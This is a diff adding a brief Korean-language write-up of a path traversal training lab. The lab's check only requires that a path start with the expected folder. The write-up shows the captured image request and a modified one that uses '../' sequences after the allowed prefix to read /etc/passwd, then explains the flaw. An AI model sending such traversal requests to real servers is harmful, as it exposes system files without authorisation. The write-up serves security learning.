@@ -1,0 +1,17 @@
+#🚩Lab: File path traversal, validation of start of path
+
+This lab contains a path traversal vulnerability in the display of product images.
+
+The application transmits the full file path via a request parameter and validates that the supplied path starts with the expected folder.
+
+To solve the lab, retrieve the contents of the /etc/passwd file.
+
+### 🔍 분석 및 공격 과정
+1. 이미지파일을 요청하는 패킷을 proxy로 캡처해보면 리퀘스트라인이 다음과 같다.
+  `GET /image?filename=/var/www/images/31.jpg HTTP/2`
+2. `GET /image?filename=/var/www/images/../../../etc/passwd`로 수정해주는 것만으로 간단히 우회가 가능하다.
+
+### 💡 취약점 원리
+해당 lab같은 경우 경로가 /var/www/images로 시작하는지만 체크하고 그 이외에는 아무 방어도 구현되어 있지 않기에 가능하다.
+
+
